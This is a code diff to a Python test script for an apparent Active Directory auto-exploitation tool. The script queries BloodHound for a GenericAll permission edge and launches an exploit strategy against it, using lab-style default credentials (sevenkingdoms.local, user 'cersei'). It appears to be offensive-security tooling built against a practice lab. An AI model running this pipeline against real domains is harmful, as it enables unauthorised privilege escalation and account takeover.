@@ -3,32 +3,47 @@ import os
 import sys
 from dotenv import load_dotenv
 
-from rich.console import Console
-
 from entities.client import Client
 from entities.node import Node
 from entities.node_kind import NodeKind
+from entities.edge import Edge
+from entities.edge_kind import EdgeKind
+
 from utils.request import BHRequest
+from utils.platform import BACKEND
+
 from services.pathfinding import get_path
-from exceptions.no_path_error import NoPathError
-from exceptions.auto_pwn_exception import AutoPwnException
 from services.printing import print_check, print_done, print_error, print_warning, print_title, print_node
 from services.reporting import *
-from services.parse_objects import parse_node
+from services.parse_objects import *
 
+from exceptions.no_path_error import NoPathError
+from exceptions.auto_pwn_exception import AutoPwnException
+from exceptions.config_error import ConfigError
+from exceptions.hop_failed_error import HopFailedError
+
+from strategies.generic_all import GenericAllStrategy
 
 load_dotenv()
 
 # ─── 1. Load credentials ────────────────────────────────────────────────────
 
-TOKEN_ID  = os.getenv("BLOODHOUND_TOKEN_ID")
+TOKEN_ID = os.getenv("BLOODHOUND_TOKEN_ID")
 TOKEN_KEY = os.getenv("BLOODHOUND_TOKEN_KEY")
-BH_URL    = os.getenv("BLOODHOUND_URL", "http://127.0.0.1:8080")
+BH_URL = os.getenv("BLOODHOUND_URL", "http://127.0.0.1:8080")
 
-client = Client(TOKEN_ID, TOKEN_KEY, BH_URL)
-bh = BHRequest(client)
-client.check_credentials()
-print_check(f"Credentials loaded — connecting to {BH_URL}")
+try:
+    client = Client(TOKEN_ID, TOKEN_KEY, BH_URL)
+    bh = BHRequest(client)
+
+    print_check(f"Credentials loaded — connecting to {BH_URL}")
+
+except ConfigError as e:
+    print_error(f"{e}")
+    sys.exit(1)
+except Exception as e:
+    print_error(f"Unexpected error while initializing client: {e}")
+    sys.exit(1)
 
 # ─── 2. Connectivity check ───────────────────────────────────────────────────
 
@@ -137,14 +152,8 @@ if not path_found:
 
 print_done("All checks complete.")
 
-# ─── 8. Find & exploit a GenericWrite edge ───────────────────────────────────
-
-from entities.edge_kind import EdgeKind
-from entities.edge import Edge
-from utils.platform import BACKEND
-from strategies.generic_write import GenericWriteStrategy
-
-print_title("Step 7 — Testing GenericWrite exploit")
+# ─── 8. Find & exploit a GenericAll edge ───────────────────────────────────
+print_title("Step 7 — Testing GenericAll exploit")
 
 # ── 8a. Détecter le backend ───────────────────────────────────────────────────
 
@@ -153,12 +162,11 @@ if BACKEND.name == "none":
     print_error("No backend available. Install bloodyAD (Linux) or bloodyAD in WSL (Windows).")
     print_warning("Skipping exploit test.")
 else:
+    # ── 8b. Chercher un edge GenericAll dans Neo4j ──────────────────────────
 
-    # ── 8b. Chercher un edge GenericWrite dans Neo4j ──────────────────────────
-
-    gw_result = bh.bh_post("/api/v2/graphs/cypher", {
+    ga_result = bh.bh_post("/api/v2/graphs/cypher", { # GenericWrite
         "query": """
-            MATCH (src)-[r:GenericWrite|GenericAll]->(dst)
+            MATCH (src)-[r:GenericAll]->(dst)
             WHERE src.enabled = true
             RETURN src, r, dst
             LIMIT 1
@@ -166,70 +174,45 @@ else:
         "include_properties": True
     })
 
-    gw_nodes = gw_result.get("data", {}).get("nodes", {}) if gw_result else {}
-    gw_edges = gw_result.get("data", {}).get("edges", []) if gw_result else []
+    ga_nodes = ga_result.get("data", {}).get("nodes", {}) if ga_result else {}
+    ga_edges = ga_result.get("data", {}).get("edges", []) if ga_result else []
 
-    if not gw_edges:
-        print_warning("No GenericWrite/GenericAll edge found in the graph.")
+    if not ga_edges:
+        print_warning("No GenericAll edge found in the graph.") # /GenericWrite
+    elif not ga_nodes:
+        print_warning("No GenericAll nodes found in the graph.") # /GenericWrite
     else:
-        raw_edge = gw_edges[0]
-        print_check(f"Found edge: {raw_edge['label']} — {raw_edge['source']} → {raw_edge['target']}")
+        nodes = parse_dict_node(n=ga_nodes)
+        edge = parse_list_edge(e=ga_edges, nodes=nodes)[0]
 
-        # ── 8c. Résoudre src et dst depuis les nodes ──────────────────────────
+        src_node = edge.start
+        dst_node = edge.target
+        print_check(f"Found edge: {edge.kind.value} — {src_node} → {dst_node}")
+        print_check(f"Attacker : {src_node.label}  ({src_node.kind.value})")
+        print_check(f"Target   : {dst_node.label}  ({dst_node.kind.value})")
 
-        src_data = gw_nodes.get(raw_edge["source"])
-        dst_data = gw_nodes.get(raw_edge["target"])
+        strategy = GenericAllStrategy(edge=edge)
+        print_check(f"can_exploit() → {strategy.can_exploit()}")
 
-        if src_data is None or dst_data is None:
-            print_error("Could not resolve source or target node from query result.")
-        else:
-            src_node = parse_node(src_data)
-            dst_node = parse_node(dst_data)
+        creds = {
+            "dc_ip":    os.getenv("DC_IP",       "192.168.56.10"),
+            "domain":   os.getenv("AD_DOMAIN",   "sevenkingdoms.local"),
+            "username": os.getenv("AD_USERNAME", "cersei"),
+            "password": os.getenv("AD_PASSWORD", "cersei"),
+            # "hashes": os.getenv("AD_HASHES"),  # LM:NT si PTH
+        }
 
-            if src_node is None or dst_node is None:
-                print_error("Node parsing failed (unknown kind?).")
+        print_check(f"Launching exploit — {edge.kind.value}")
+
+        result = strategy.exploit(creds)
+        try:
+            if result.was_executed():
+                print_done(f"Exploit succeeded! Technique: {result.technique}")
+                print_check(f"Output:\n{result.summary()}")
+                result.print_next_steps()
+            elif result.is_dry_run():
+                print_warning(f"Exploit returned success=None:\n{result.output}")
             else:
-                print_check(f"Attacker : {src_node.label}  ({src_node.kind.value})")
-                print_check(f"Target   : {dst_node.label}  ({dst_node.kind.value})")
-
-                # ── 8d. Construire l'edge et la stratégie ─────────────────────
-
-                try:
-                    edge_kind = EdgeKind(raw_edge["kind"])
-                except ValueError:
-                    print_error(f"Unknown EdgeKind: {raw_edge['kind']}")
-                    edge_kind = None
-
-                if edge_kind:
-                    edge     = Edge(source_node=src_node, goal_node=dst_node, kind=edge_kind)
-                    strategy = GenericWriteStrategy(edge=edge, victim=src_node)
-
-                    print_check(f"can_exploit() → {strategy.can_exploit()}")
-
-                    if not strategy.can_exploit():
-                        print_warning("Strategy says it cannot exploit this edge.")
-                    else:
-                        # ── 8e. Creds depuis .env ─────────────────────────────
-                        creds = {
-                            "dc_ip":    os.getenv("DC_IP",       "192.168.56.10"),
-                            "domain":   os.getenv("AD_DOMAIN",   "sevenkingdoms.local"),
-                            "username": os.getenv("AD_USERNAME", "cersei"),
-                            "password": os.getenv("AD_PASSWORD", "cersei"),
-                            # "hashes": os.getenv("AD_HASHES"),  # LM:NT si PTH
-                        }
-
-                        print_check(
-                            f"Launching exploit — "
-                            f"{src_node.label} ──[{edge_kind.value}]──▶ {dst_node.label}"
-                        )
-
-                        try:
-                            from exceptions.hop_failed_error import HopFailedError
-                            result = strategy.exploit(creds)
-                            if result.success:
-                                print_done(f"Exploit succeeded! Technique: {result.technique}")
-                                print_check(f"Output:\n{result.summary}")
-                            else:
-                                print_warning(f"Exploit returned success=False:\n{result.output}")
-                        except HopFailedError as e:
-                            print_error(f"HopFailedError: {e}")
+                print_warning(f"Exploit returned success=False:\n{result.output}")
+        except HopFailedError as e:
+            print_error(f"HopFailedError: {e}")
